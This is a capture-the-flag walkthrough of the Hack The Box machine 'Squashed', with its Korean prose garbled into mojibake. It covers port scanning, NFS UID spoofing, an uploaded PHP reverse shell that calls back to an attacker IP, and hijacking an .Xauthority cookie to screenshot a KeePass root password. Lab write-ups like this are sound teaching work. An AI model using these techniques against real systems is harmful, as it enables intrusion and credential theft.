---
title: "[Hack The Box] Squashed í’€ì´"
categories:
  - Hack-The-Box
tags:
  - HTB
  - Hack The Box
  - Squashed
toc: true
toc_sticky: true
toc_label: "Squashed í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/hackthebox.jpeg
---

ğŸ’¡ Hack-The-Box Squashed í’€ì´ ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ

![image](https://user-images.githubusercontent.com/33647663/218132303-ba0cb637-f311-41c6-8321-e5a27d9d167f.png)


# Enumeration

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]
â””â”€$ nmap -sVC -p - 10.129.86.233 --min-rate 1000 -vv
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-10 10:25 EST
PORT      STATE    SERVICE  REASON      VERSION
22/tcp    open     ssh      syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http     syn-ack     Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open     rpcbind  syn-ack     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   .. skip
|   
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open     nfs_acl  syn-ack     3 (RPC #100227)
5089/tcp  filtered unknown  no-response
27249/tcp filtered unknown  no-response
39825/tcp open     mountd   syn-ack     1-3 (RPC #100005)
42647/tcp open     nlockmgr syn-ack     1-4 (RPC #100021)
49236/tcp filtered unknown  no-response
51659/tcp open     mountd   syn-ack     1-3 (RPC #100005)
53596/tcp filtered unknown  no-response
59311/tcp open     mountd   syn-ack     1-3 (RPC #100005)
64476/tcp filtered unknown  no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 85.90 seconds

```

ì£¼ìš”í•˜ê²Œ ë³¼ ì„œë¹„ìŠ¤ëŠ” http(80), NFS(2049) í¬íŠ¸ ì…ë‹ˆë‹¤.

# HTTP

![image](https://user-images.githubusercontent.com/33647663/218137303-01df25d3-fa90-4052-81e1-8e7dd5a5a93c.png)

ì‚¬ì´íŠ¸ ìì²´ì— ì‚´í´ë³¼ í¬ì¸íŠ¸ê°€ ë”±íˆ ë³´ì´ì§€ê°€ ì•ŠìŠµë‹ˆë‹¤.
gobuster ë¥¼ ì‚¬ìš©í•˜ì—¬ ìˆ¨ê²¨ì§„ í˜ì´ì§€ê°€ ìˆëŠ”ì§€ í™•ì¸í•´ ë´…ë‹ˆë‹¤.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]
â””â”€ gobuster dir -u http://10.129.86.233/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.86.233/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/10 11:05:37 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.129.86.233/css/]
/images               (Status: 301) [Size: 315] [--> http://10.129.86.233/images/]
/index.html           (Status: 200) [Size: 32532]                                 
/js                   (Status: 301) [Size: 311] [--> http://10.129.86.233/js/]    
/server-status        (Status: 403) [Size: 278]                                   
                                                                                  
===============================================================
2023/02/10 11:06:14 Finished
===============================================================
                                                                   
```

ì‚´í´ë³¼ ì§€ì ì€ /server-status í˜ì´ì§€ê°€ 403 Forbidden ì´ë¼ëŠ” ì  ë§ê³ ëŠ” íŠ¹ë³„í•œ ê²°ê³¼ê°€ ë‚˜ì˜¤ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.

# NFS

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]
â””â”€$ showmount -a 10.129.86.233 
All mount points on 10.129.86.233:
                                                                                                                    
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]
â””â”€$ showmount -e 10.129.86.233
Export list for 10.129.86.233:
/home/ross    *
/var/www/html *
```

```/home/ross``` , ```/var/www/html``` ë””ë ‰í„°ë¦¬ 2ê°œê°€ export ë˜ì–´ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. NFS íŒŒì¼ì‹œìŠ¤í…œìœ¼ë¡œ ë§ˆìš´íŠ¸ í•œ ë’¤, ê·¸ êµ¬ì¡°ë¥¼ ì‚´í´ë´…ë‹ˆë‹¤.

```bash
mkdir -p mnt/ross
mkdir -p mnt/html
cd mnt

mount -t 10.129.86.233:/home/ross ross
mount -t 10.129.86.233:/var/www/html html
```

ë§ˆìš´íŠ¸ í•˜ê³  ê·¸ êµ¬ì¡°ë¥¼ ì‚´í´ë³´ë©´ ê°ê°ì˜ ë””ë ‰í„°ë¦¬ì— ê¶Œí•œì´ uid 2017, uid 1001ë¡œ ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/mnt]
â””â”€ls -al
total 16
drwxr-xr-x  4 root root     4096 Feb 10 11:21 .
drwxr-xr-x 11 kali kali     4096 Feb 10 11:19 ..
drwxr-xr--  5 2017 www-data 4096 Feb 10 11:20 html
drwxr-xr-x 14 1001     1001 4096 Feb 10 10:20 ross
```

NFS ì„œë¹„ìŠ¤ íŠ¹ì„±ìƒ root squashedê°€ ë˜ì–´ìˆì„ í™•ë¥ ì´ í¬ê¸° ë•Œë¬¸ì— ìµœëŒ€ ê¶Œí•œì„ ì–»ê¸° ìœ„í•´ì„œ ê°ê° uid 2017, uid 1001ì˜ ì‚¬ìš©ìë¥¼ ë§Œë“¤ì–´ì„œ íŒŒì¼ì— ì ‘ê·¼ì„ ì‹œë„í•©ë‹ˆë‹¤.

```bash
useradd -u 1001 user1001
useradd -u 2017 user2017
```

ë¨¼ì € user2017ì˜ ê¶Œí•œìœ¼ë¡œ ì ‘ê·¼í•˜ì—¬ /var/www/htmlí´ë”ì˜ êµ¬ì¡°ë¥¼ í™•ì¸í•©ë‹ˆë‹¤.

```bash
user2017@kali:/home/kali/Desktop/mnt/html$ tree
.
â”œâ”€â”€ css
â”‚Â Â  â”œâ”€â”€ animate.min.css
â”‚Â Â  â”œâ”€â”€ bootstrap.css
â”‚Â Â  â”œâ”€â”€ bootstrap.css.map
â”‚Â Â  â”œâ”€â”€ bootstrap-grid.css
â”‚Â Â  â”œâ”€â”€ bootstrap-grid.css.map
â”‚Â Â  â”œâ”€â”€ bootstrap-grid.min.css
â”‚Â Â  â”œâ”€â”€ bootstrap-grid.min.css.map
â”‚Â Â  â”œâ”€â”€ bootstrap.min.css
â”‚Â Â  â”œâ”€â”€ bootstrap.min.css.map
â”‚Â Â  â”œâ”€â”€ bootstrap-reboot.css
â”‚Â Â  â”œâ”€â”€ bootstrap-reboot.css.map
â”‚Â Â  â”œâ”€â”€ bootstrap-reboot.min.css
â”‚Â Â  â”œâ”€â”€ bootstrap-reboot.min.css.map
â”‚Â Â  â”œâ”€â”€ default-skin.css
â”‚Â Â  â”œâ”€â”€ font-awesome.min.css
â”‚Â Â  â”œâ”€â”€ icomoon.css
â”‚Â Â  â”œâ”€â”€ jquery.fancybox.min.css
â”‚Â Â  â”œâ”€â”€ jquery.mCustomScrollbar.min.css
â”‚Â Â  â”œâ”€â”€ jquery-ui.css
â”‚Â Â  â”œâ”€â”€ meanmenu.css
â”‚Â Â  â”œâ”€â”€ nice-select.css
â”‚Â Â  â”œâ”€â”€ normalize.css
â”‚Â Â  â”œâ”€â”€ owl.carousel.min.css
â”‚Â Â  â”œâ”€â”€ responsive.css
â”‚Â Â  â”œâ”€â”€ slick.css
â”‚Â Â  â””â”€â”€ style.css
â”œâ”€â”€ images
â”‚Â Â  â”œâ”€â”€ banner-bg.png
â”‚Â Â  â”œâ”€â”€ bg-1.png
â”‚Â Â  â”œâ”€â”€ contact-bg.png
â”‚Â Â  â”œâ”€â”€ fb-icon.png
â”‚Â Â  â”œâ”€â”€ footer-logo.png
â”‚Â Â  â”œâ”€â”€ header-bg.png
â”‚Â Â  â”œâ”€â”€ icon-1.png
â”‚Â Â  â”œâ”€â”€ icon-2.png
â”‚Â Â  â”œâ”€â”€ icon-3.png
â”‚Â Â  â”œâ”€â”€ icon-4.png
â”‚Â Â  â”œâ”€â”€ img-1.png
â”‚Â Â  â”œâ”€â”€ img-2.png
â”‚Â Â  â”œâ”€â”€ img-3.png
â”‚Â Â  â”œâ”€â”€ img-4.png
â”‚Â Â  â”œâ”€â”€ img-5.png
â”‚Â Â  â”œâ”€â”€ img-6.png
â”‚Â Â  â”œâ”€â”€ img-7.png
â”‚Â Â  â”œâ”€â”€ img-8.png
â”‚Â Â  â”œâ”€â”€ img-9.png
â”‚Â Â  â”œâ”€â”€ instagram-icon.png
â”‚Â Â  â”œâ”€â”€ left-arrow.png
â”‚Â Â  â”œâ”€â”€ linkedin-icon.png
â”‚Â Â  â”œâ”€â”€ logo.png
â”‚Â Â  â”œâ”€â”€ quote-icon.png
â”‚Â Â  â”œâ”€â”€ right-arrow.png
â”‚Â Â  â”œâ”€â”€ search-icon.png
â”‚Â Â  â””â”€â”€ twitter-icon.png
â”œâ”€â”€ index.html
â””â”€â”€ js
    â”œâ”€â”€ bootstrap.bundle.min.js
    â”œâ”€â”€ custom.js
    â”œâ”€â”€ jquery-3.0.0.min.js
    â”œâ”€â”€ jquery.mCustomScrollbar.concat.min.js
    â”œâ”€â”€ jquery.min.js
    â”œâ”€â”€ plugin.js
    â””â”€â”€ popper.min.js
```

ì›¹ì‚¬ì´íŠ¸ í´ë”ë¡œ í™•ì¸ì´ ë©ë‹ˆë‹¤. ë”°ë¼ì„œ í•´ë‹¹ í´ë”ì— ì“°ê¸° ê¶Œí•œì´ ìˆìœ¼ë¯€ë¡œ ì›¹ì‰˜ì„ ì—…ë¡œë“œ í•˜ë©´ ì¼ë°˜ì‚¬ìš©ì ì‰˜ì„ íšë“ ê°€ëŠ¥í•©ë‹ˆë‹¤.

ì›¹ì‰˜ì€ ê¹ƒí—ˆë¸Œì— ìˆëŠ” í˜ì´ë¡œë“œë¥¼ ì°¸ê³ í•˜ì˜€ìŠµë‹ˆë‹¤.

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.48';  // Kali linux IP
$port = 4444;       // Listening Port
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

.. ìƒëµ

```

![image](https://user-images.githubusercontent.com/33647663/218146216-dde3d8ea-4706-466d-b873-123bbf94fb0a.png)

ì´ë ‡ê²Œ í•˜ì—¬ ì¼ë°˜ì‚¬ìš©ì ê¶Œí•œ íšë“ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/218146507-004287c1-20c6-42c4-938f-e723be818e79.png)


ê·¸ ë‹¤ìŒìœ¼ë¡œ root ê¶Œí•œì„ ìœ„í•œ ê¶Œí•œ ìƒìŠ¹ì´ í•„ìš”í•©ë‹ˆë‹¤.

ì•„ê¹Œ mount í•˜ê³  ì‚´í´ë³´ì§€ ì•Šì•˜ë˜ /home/ross íŒŒì¼ì„ ì‚´í´ë´…ë‹ˆë‹¤.

```bash
$ cd ross
$ tree
.
â”œâ”€â”€ Desktop
â”œâ”€â”€ Documents
â”‚Â Â  â””â”€â”€ Passwords.kdbx
â”œâ”€â”€ Downloads
â”œâ”€â”€ Music
â”œâ”€â”€ Pictures
â”œâ”€â”€ Public
â”œâ”€â”€ Templates
â””â”€â”€ Videos

```
treeì˜ ê²°ê³¼ë¡œ ë³´ë©´ ```Passwords.kdbx``` íŒŒì¼ì´ ì¡´ì¬í•©ë‹ˆë‹¤. í‚¤íŒ¨ìŠ¤ ë¼ëŠ” ì†Œí”„íŠ¸ì›¨ì–´ì—ì„œ ì‚¬ìš©í•˜ëŠ” ë°ì´í„°ë² ì´ìŠ¤ íŒŒì¼ë¡œ ë³´ì…ë‹ˆë‹¤. êµ¬ê¸€ë§ ê²°ê³¼ johntheripperë¥¼ í†µí•´ì„œ í¬ë˜í‚¹ ì‹œë„ê°€ ê°€ëŠ¥í•  ê²ƒìœ¼ë¡œ ë³´ì—¬ì„œ ì‹œë„í•´ ë³´ì•˜ìŠµë‹ˆë‹¤.

```bash
$ keepass2john Passwords.kdbx >> Keepasshash.txt
 Passwords.kdbx : File version '40000' is currently not supported!
```

í•´ë‹¹ ë©”ì‹œì§€ ë‚´ìš©ì„ êµ¬ê¸€ë§ í•´ë³´ë‹ˆ, í˜„ì¬ johntheripperëŠ” keepass 3.1ê¹Œì§€ë§Œ ì§€ì›í•˜ì—¬ í¬ë˜í‚¹ ì‹œë„ê°€ ë¶ˆê°€ëŠ¥ í•  ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤. 

![image](https://user-images.githubusercontent.com/33647663/218153923-19a1d17b-57f9-4c22-b241-5ee668f6d085.png)


```bash
$ ls -al
total 68
drwxr-xr-x 14 user1001 user1001 4096 Feb 10 10:20 .
drwxr-xr-x  4 root     root     4096 Feb 10 11:21 ..
lrwxrwxrwx  1 root     root        9 Oct 20 09:24 .bash_history -> /dev/null
drwx------ 11 user1001 user1001 4096 Oct 21 10:57 .cache
drwx------ 12 user1001 user1001 4096 Oct 21 10:57 .config
drwxr-xr-x  2 user1001 user1001 4096 Oct 21 10:57 Desktop
drwxr-xr-x  2 user1001 user1001 4096 Oct 21 10:57 Documents
drwxr-xr-x  2 user1001 user1001 4096 Oct 21 10:57 Downloads
drwx------  3 user1001 user1001 4096 Oct 21 10:57 .gnupg
drwx------  3 user1001 user1001 4096 Oct 21 10:57 .local
drwxr-xr-x  2 user1001 user1001 4096 Oct 21 10:57 Music
drwxr-xr-x  2 user1001 user1001 4096 Oct 21 10:57 Pictures
drwxr-xr-x  2 user1001 user1001 4096 Oct 21 10:57 Public
drwxr-xr-x  2 user1001 user1001 4096 Oct 21 10:57 Templates
drwxr-xr-x  2 user1001 user1001 4096 Oct 21 10:57 Videos
lrwxrwxrwx  1 root     root        9 Oct 21 09:07 .viminfo -> /dev/null
-rw-------  1 user1001 user1001   57 Feb 10 10:20 .Xauthority
-rw-------  1 user1001 user1001 2475 Feb 10 10:20 .xsession-errors
-rw-------  1 user1001 user1001 2475 Dec 27 10:33 .xsession-errors.old
```

ë‹¤ì‹œ ë‹¤ë¥¸ ì ‘ê·¼ë²•ì„ ì°¾ì•„ë³´ë‹ˆ, .Xauthority íŒŒì¼ì´ ëˆˆì— ë•ë‹ˆë‹¤. X11ì„ ì´ìš©í•˜ë©´ ì›ê²© ë””ìŠ¤í”Œë ˆì´ì— ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ë¥¼ ì´ìš©í•˜ì—¬ ì ‘ê·¼ ê°€ëŠ¥í•œ ë””ìŠ¤í”Œë ˆì´ì— ì ‘ê·¼ì„ ì‹œë„í•´ ë´…ë‹ˆë‹¤.

ìš°ì„  í˜„ì¬ /home/ross í´ë”ì—ì„œì˜ .Xauthority íŒŒì¼ì´ë¯€ë¡œ ross ê³„ì •ì´ ì ‘ì†í•˜ì—¬ ìˆê³ , Xìœˆë„ìš° í™˜ê²½ìœ¼ë¡œ í™”ë©´ì„ ë³´ê³  ìˆë‹¤ë©´ ì´ íŒŒì¼ì„ í†µí•´ì„œ í•´ë‹¹ ê³„ì •ì˜ ë””ìŠ¤í”Œë ˆì´ë¡œ ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

íšë“í•œ ì‰˜ì—ì„œ w ëª…ë ¹ì–´ë¡œ í™•ì¸í•´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì´ ross ê³„ì •ì´ ì ‘ì†í•˜ì—¬ ìˆìŒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/218155721-b0850374-5da7-4dfd-8af6-f3376d17da1d.png)


ë‹¤ìŒì˜ ê³¼ì •ì„ í†µí•´ì„œ .Xauthority ì¸ì¦ì„ í•˜ê³ , í™”ë©´ ì •ë³´ë¥¼ ì½ì–´ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.


```bash
# in kali machine
$ cat .Xauthority | base64
AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABDdylLf287BoiIFuDv67apd
```

```bash
# in target machine
$ echo "AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABDdylLf287BoiIFuDv67apd" | base64 -d > /tmp/.Xauthority
$ export XAUTHORITY=/tmp/.Xauthority
$ xwd -root -display :0 > /tmp/screen.xwd

# root: select root window
# display: specify server to connect to
```
0ë²ˆ ë””ìŠ¤í”Œë ˆì´ í™”ë©´ì´ ```screen.xwd``` íŒŒì¼ë¡œ ì €ì¥ì´ ë©ë‹ˆë‹¤.
í•´ë‹¹ íŒŒì¼ì„ ì¹¼ë¦¬ë¦¬ëˆ…ìŠ¤ë¡œ ì˜®ê²¨ ì˜¨ë’¤, ```convert``` ëª…ë ¹ì–´ë¡œ png íŒŒì¼ë¡œ ë³€í™˜í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ìº¡ì³ëœ í™”ë©´ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
convert screen.xwd screen.png
```

í™”ë©´ì˜ ë‚´ìš©ì€ keepass í”„ë¡œê·¸ë¨ì„ í†µí•´ì„œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ê´€ë¦¬í•˜ëŠ” í™”ë©´ì´ê³ , í•´ë‹¹í™”ë©´ì„ í†µí•´ì„œ root ê³„ì •ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ íšë“í•˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤ ì…ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/218160241-2d15e5b6-a887-482f-a145-b27f33e78a42.png)